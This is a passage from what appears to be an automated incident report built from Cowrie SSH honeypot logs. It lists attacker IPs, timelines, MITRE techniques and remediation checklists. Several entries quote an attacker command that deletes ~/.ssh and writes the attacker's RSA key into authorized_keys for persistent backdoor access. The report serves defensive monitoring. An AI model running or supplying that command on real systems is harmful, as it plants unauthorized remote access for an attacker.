| `2026-05-16 17:41:49` | `cowrie.client.kex` |
| `2026-05-16 17:41:50` | `cowrie.login.success` |
| `2026-05-16 17:41:51` | `cowrie.session.params` |
| `2026-05-16 17:41:51` | `cowrie.command.input` |
| `2026-05-16 17:41:51` | `cowrie.command.failed` |
| `2026-05-16 17:41:51` | `cowrie.log.closed` |
| `2026-05-16 17:41:51` | `cowrie.session.params` |
| `2026-05-16 17:41:51` | `cowrie.command.input` |
| `2026-05-16 17:41:51` | `cowrie.session.file_download` |
| `2026-05-16 17:41:51` | `cowrie.log.closed` |
| `2026-05-16 17:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaf36c543cb5

| Field | Detail |
|---|---|
| **Source IP** | `106.13.48[.]156` |
| **First Seen** | 2026-05-16 17:41 |
| **Last Seen** | 2026-05-16 17:42 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:41:50` | `cowrie.session.connect` |
| `2026-05-16 17:41:50` | `cowrie.client.version` |
| `2026-05-16 17:41:51` | `cowrie.client.kex` |
| `2026-05-16 17:41:54` | `cowrie.login.success` |
| `2026-05-16 17:41:57` | `cowrie.session.params` |
| `2026-05-16 17:41:57` | `cowrie.command.input` |
| `2026-05-16 17:41:57` | `cowrie.command.failed` |
| `2026-05-16 17:41:58` | `cowrie.log.closed` |
| `2026-05-16 17:41:59` | `cowrie.session.params` |
| `2026-05-16 17:41:59` | `cowrie.command.input` |
| `2026-05-16 17:41:59` | `cowrie.session.file_download` |
| `2026-05-16 17:41:59` | `cowrie.log.closed` |
| `2026-05-16 17:42:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.48[.]156` to AbuseIPDB if not already reported
- [ ] Block `106.13.48[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c32419e2a360

| Field | Detail |
|---|---|
| **Source IP** | `103.63.108[.]25` |
| **First Seen** | 2026-05-16 17:41 |
| **Last Seen** | 2026-05-16 17:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:41:54` | `cowrie.session.connect` |
| `2026-05-16 17:41:54` | `cowrie.client.version` |
| `2026-05-16 17:41:54` | `cowrie.client.kex` |
| `2026-05-16 17:41:55` | `cowrie.login.success` |
| `2026-05-16 17:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.108[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.63.108[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6184d1b35e3d

| Field | Detail |
|---|---|
| **Source IP** | `106.13.48[.]156` |
| **First Seen** | 2026-05-16 17:42 |
| **Last Seen** | 2026-05-16 17:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:42:14` | `cowrie.session.connect` |
| `2026-05-16 17:42:14` | `cowrie.client.version` |
| `2026-05-16 17:42:14` | `cowrie.client.kex` |
| `2026-05-16 17:42:17` | `cowrie.login.success` |
| `2026-05-16 17:42:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.48[.]156` to AbuseIPDB if not already reported
- [ ] Block `106.13.48[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-319e65c3d9d6

| Field | Detail |
|---|---|
| **Source IP** | `121.168.139[.]251` |
| **First Seen** | 2026-05-16 17:53 |
| **Last Seen** | 2026-05-16 17:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:53:05` | `cowrie.session.connect` |
| `2026-05-16 17:53:05` | `cowrie.client.version` |
| `2026-05-16 17:53:05` | `cowrie.client.kex` |
| `2026-05-16 17:53:06` | `cowrie.login.success` |
| `2026-05-16 17:53:06` | `cowrie.session.params` |
| `2026-05-16 17:53:06` | `cowrie.command.input` |
| `2026-05-16 17:53:06` | `cowrie.command.failed` |
| `2026-05-16 17:53:06` | `cowrie.log.closed` |
| `2026-05-16 17:53:07` | `cowrie.session.params` |
| `2026-05-16 17:53:07` | `cowrie.command.input` |
| `2026-05-16 17:53:07` | `cowrie.session.file_download` |
| `2026-05-16 17:53:07` | `cowrie.log.closed` |
| `2026-05-16 17:53:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.168.139[.]251` to AbuseIPDB if not already reported
- [ ] Block `121.168.139[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dfb15e35cf6

| Field | Detail |
|---|---|
| **Source IP** | `121.168.139[.]251` |
| **First Seen** | 2026-05-16 17:53 |
| **Last Seen** | 2026-05-16 17:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:53:09` | `cowrie.session.connect` |
| `2026-05-16 17:53:09` | `cowrie.client.version` |
| `2026-05-16 17:53:09` | `cowrie.client.kex` |
| `2026-05-16 17:53:09` | `cowrie.login.success` |
| `2026-05-16 17:53:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.168.139[.]251` to AbuseIPDB if not already reported
- [ ] Block `121.168.139[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-457913a95e47

| Field | Detail |
|---|---|
| **Source IP** | `112.219.104[.]42` |
| **First Seen** | 2026-05-16 17:55 |
| **Last Seen** | 2026-05-16 17:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:55:47` | `cowrie.session.connect` |
| `2026-05-16 17:55:47` | `cowrie.client.version` |
| `2026-05-16 17:55:47` | `cowrie.client.kex` |
| `2026-05-16 17:55:47` | `cowrie.login.success` |
| `2026-05-16 17:55:48` | `cowrie.session.params` |
| `2026-05-16 17:55:48` | `cowrie.command.input` |
| `2026-05-16 17:55:48` | `cowrie.command.failed` |
| `2026-05-16 17:55:48` | `cowrie.log.closed` |
| `2026-05-16 17:55:48` | `cowrie.session.params` |
| `2026-05-16 17:55:48` | `cowrie.command.input` |
| `2026-05-16 17:55:48` | `cowrie.session.file_download` |
| `2026-05-16 17:55:48` | `cowrie.log.closed` |
| `2026-05-16 17:55:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.219.104[.]42` to AbuseIPDB if not already reported
- [ ] Block `112.219.104[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e21dc8871d9b

| Field | Detail |
|---|---|
| **Source IP** | `112.219.104[.]42` |
| **First Seen** | 2026-05-16 17:55 |
| **Last Seen** | 2026-05-16 17:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:55:50` | `cowrie.session.connect` |
| `2026-05-16 17:55:50` | `cowrie.client.version` |
| `2026-05-16 17:55:50` | `cowrie.client.kex` |
| `2026-05-16 17:55:51` | `cowrie.login.success` |
| `2026-05-16 17:55:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.219.104[.]42` to AbuseIPDB if not already reported
- [ ] Block `112.219.104[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9c5e07d6a53

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-16 17:57 |
| **Last Seen** | 2026-05-16 17:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:57:40` | `cowrie.session.connect` |
| `2026-05-16 17:57:40` | `cowrie.client.version` |
| `2026-05-16 17:57:40` | `cowrie.client.kex` |
| `2026-05-16 17:57:41` | `cowrie.login.success` |
| `2026-05-16 17:57:42` | `cowrie.session.params` |
| `2026-05-16 17:57:42` | `cowrie.command.input` |
| `2026-05-16 17:57:42` | `cowrie.command.failed` |
| `2026-05-16 17:57:42` | `cowrie.log.closed` |
| `2026-05-16 17:57:43` | `cowrie.session.params` |
| `2026-05-16 17:57:43` | `cowrie.command.input` |
| `2026-05-16 17:57:43` | `cowrie.session.file_download` |
| `2026-05-16 17:57:43` | `cowrie.log.closed` |
| `2026-05-16 17:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0803417138ce

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-16 17:57 |
| **Last Seen** | 2026-05-16 17:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:57:46` | `cowrie.session.connect` |
| `2026-05-16 17:57:46` | `cowrie.client.version` |
| `2026-05-16 17:57:47` | `cowrie.client.kex` |
| `2026-05-16 17:57:48` | `cowrie.login.success` |
| `2026-05-16 17:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be22f8a8f449

| Field | Detail |
|---|---|
| **Source IP** | `92.175.80[.]209` |
| **First Seen** | 2026-05-16 18:05 |
| **Last Seen** | 2026-05-16 18:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 18:05:53` | `cowrie.session.connect` |
| `2026-05-16 18:05:53` | `cowrie.client.version` |
| `2026-05-16 18:05:53` | `cowrie.client.kex` |
| `2026-05-16 18:05:54` | `cowrie.login.success` |
| `2026-05-16 18:05:54` | `cowrie.session.params` |
| `2026-05-16 18:05:54` | `cowrie.command.input` |
| `2026-05-16 18:05:54` | `cowrie.command.failed` |
| `2026-05-16 18:05:55` | `cowrie.log.closed` |
| `2026-05-16 18:05:55` | `cowrie.session.params` |
| `2026-05-16 18:05:55` | `cowrie.command.input` |
| `2026-05-16 18:05:55` | `cowrie.session.file_download` |
| `2026-05-16 18:05:55` | `cowrie.log.closed` |
| `2026-05-16 18:05:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.175.80[.]209` to AbuseIPDB if not already reported
- [ ] Block `92.175.80[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01efee1a4d02

| Field | Detail |
|---|---|
| **Source IP** | `92.175.80[.]209` |
| **First Seen** | 2026-05-16 18:05 |
| **Last Seen** | 2026-05-16 18:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 18:05:58` | `cowrie.session.connect` |
| `2026-05-16 18:05:58` | `cowrie.client.version` |
| `2026-05-16 18:05:58` | `cowrie.client.kex` |
| `2026-05-16 18:05:59` | `cowrie.login.success` |
| `2026-05-16 18:05:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.175.80[.]209` to AbuseIPDB if not already reported
- [ ] Block `92.175.80[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-855b9f373e85

| Field | Detail |
|---|---|
| **Source IP** | `43.173.69[.]147` |
| **First Seen** | 2026-05-16 18:07 |
| **Last Seen** | 2026-05-16 18:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 18:07:05` | `cowrie.session.connect` |
| `2026-05-16 18:07:05` | `cowrie.client.version` |
| `2026-05-16 18:07:06` | `cowrie.client.kex` |
| `2026-05-16 18:07:07` | `cowrie.login.success` |
| `2026-05-16 18:07:07` | `cowrie.session.params` |
| `2026-05-16 18:07:07` | `cowrie.command.input` |
| `2026-05-16 18:07:07` | `cowrie.command.failed` |
| `2026-05-16 18:07:08` | `cowrie.log.closed` |
| `2026-05-16 18:07:08` | `cowrie.session.params` |
| `2026-05-16 18:07:08` | `cowrie.command.input` |
| `2026-05-16 18:07:08` | `cowrie.session.file_download` |
| `2026-05-16 18:07:08` | `cowrie.log.closed` |
| `2026-05-16 18:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.69[.]147` to AbuseIPDB if not already reported
- [ ] Block `43.173.69[.]147` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e59e2cf74fd

| Field | Detail |
|---|---|
| **Source IP** | `43.173.69[.]147` |
| **First Seen** | 2026-05-16 18:07 |
| **Last Seen** | 2026-05-16 18:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 18:07:11` | `cowrie.session.connect` |
| `2026-05-16 18:07:11` | `cowrie.client.version` |
| `2026-05-16 18:07:12` | `cowrie.client.kex` |
| `2026-05-16 18:07:13` | `cowrie.login.success` |
| `2026-05-16 18:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.69[.]147` to AbuseIPDB if not already reported
- [ ] Block `43.173.69[.]147` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9906f50adff6

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-05-16 18:07 |
| **Last Seen** | 2026-05-16 18:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 18:07:31` | `cowrie.session.connect` |
| `2026-05-16 18:07:31` | `cowrie.client.version` |
| `2026-05-16 18:07:31` | `cowrie.client.kex` |
| `2026-05-16 18:07:33` | `cowrie.login.success` |
| `2026-05-16 18:07:34` | `cowrie.session.params` |
| `2026-05-16 18:07:34` | `cowrie.command.input` |
| `2026-05-16 18:07:34` | `cowrie.command.failed` |
| `2026-05-16 18:07:34` | `cowrie.log.closed` |
| `2026-05-16 18:07:35` | `cowrie.session.params` |
| `2026-05-16 18:07:35` | `cowrie.command.input` |
| `2026-05-16 18:07:35` | `cowrie.session.file_download` |
| `2026-05-16 18:07:35` | `cowrie.log.closed` |
| `2026-05-16 18:07:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8afbafac47c4

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-05-16 18:07 |
| **Last Seen** | 2026-05-16 18:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 18:07:39` | `cowrie.session.connect` |
| `2026-05-16 18:07:39` | `cowrie.client.version` |
| `2026-05-16 18:07:39` | `cowrie.client.kex` |
| `2026-05-16 18:07:40` | `cowrie.login.success` |
| `2026-05-16 18:07:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-786cccf2985a

| Field | Detail |
|---|---|
| **Source IP** | `81.28.167[.]30` |
| **First Seen** | 2026-05-16 18:09 |
| **Last Seen** | 2026-05-16 18:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 18:09:28` | `cowrie.session.connect` |
| `2026-05-16 18:09:28` | `cowrie.client.version` |
| `2026-05-16 18:09:28` | `cowrie.client.kex` |
| `2026-05-16 18:09:29` | `cowrie.login.success` |
| `2026-05-16 18:09:29` | `cowrie.session.params` |
| `2026-05-16 18:09:29` | `cowrie.command.input` |
| `2026-05-16 18:09:29` | `cowrie.command.failed` |
| `2026-05-16 18:09:29` | `cowrie.log.closed` |
| `2026-05-16 18:09:30` | `cowrie.session.params` |
| `2026-05-16 18:09:30` | `cowrie.command.input` |
| `2026-05-16 18:09:30` | `cowrie.session.file_download` |
| `2026-05-16 18:09:30` | `cowrie.log.closed` |
| `2026-05-16 18:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.28.167[.]30` to AbuseIPDB if not already reported
- [ ] Block `81.28.167[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-274c99e45b98

| Field | Detail |
|---|---|
| **Source IP** | `81.28.167[.]30` |
| **First Seen** | 2026-05-16 18:09 |
| **Last Seen** | 2026-05-16 18:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 18:09:32` | `cowrie.session.connect` |
| `2026-05-16 18:09:32` | `cowrie.client.version` |
| `2026-05-16 18:09:32` | `cowrie.client.kex` |
| `2026-05-16 18:09:33` | `cowrie.login.success` |
| `2026-05-16 18:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
